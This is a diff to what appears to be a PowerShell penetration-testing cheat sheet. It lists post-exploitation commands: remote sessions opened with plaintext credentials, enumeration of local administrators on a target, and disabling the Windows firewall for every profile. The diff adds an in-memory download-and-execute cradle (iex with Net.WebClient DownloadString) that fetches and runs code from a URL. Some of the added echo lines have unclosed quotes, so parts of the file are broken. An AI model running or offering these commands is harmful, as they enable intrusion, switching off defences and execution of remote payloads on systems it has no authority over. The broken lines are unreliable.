@@ -20,6 +20,11 @@ $pass = ConvertTo-SecureString <pass> -asplaintext -force
 $cred = New-Object System.Management.Automation.PSCredential(<user>, $pass)
 $session = New-PSSession -ComputerName <target> -Credential $creds
 
+# PSSESSION
+echo '$cred = Get-Credential'
+echo 'Enter-PSSession -ComputerName <TARGET> -Authentication Negotiate -Credential $cred'
+echo '
+
 # Invoke-Command on remote computer via PS Remoting Session
 Invoke-Command -ScriptBlock{hostname;whoami;Get-LocalGroupMember -Group Administrators} -Session <session>
 
@@ -38,6 +43,5 @@ Invoke-Sqlcmd -Query '<query>' -Username <user> -Password <pass>
 # Disable windows firewall
 Set-NetFirewallProfile -Name Domain,Private,Public -Enabled False
 
-sudo chmod -x /usr/lib/evolution/evolution-addressbook-factory
-sudo chmod -x /usr/lib/evolution/evolution-calendar-factory
-sudo chmod -x /usr/lib/evolution/evolution-source-registry
+# Download in Memory
+echo 'iex (New-Object Net.WebClient).DownloadString(\'<URL>\')
